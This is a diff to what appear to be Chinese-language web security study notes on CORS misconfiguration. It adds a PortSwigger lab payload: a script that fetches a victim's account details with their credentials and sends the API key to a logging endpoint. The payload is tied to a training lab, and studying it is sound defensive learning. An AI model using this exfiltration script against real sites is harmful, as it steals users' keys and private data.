@@ -18,6 +18,19 @@ CORS资源共享漏洞：
 ^
 跨域获取铭感信息key，再把key传递给黑阔
 ![](.topwrite/assets/image_1742744397237.png)
+```
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
 
+    function reqListener() {
+        location='/log?key='+this.responseText;
+    };
+</script>
+```
+<https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack>
 特征
 ![](.topwrite/assets/image_1742744460081.png)
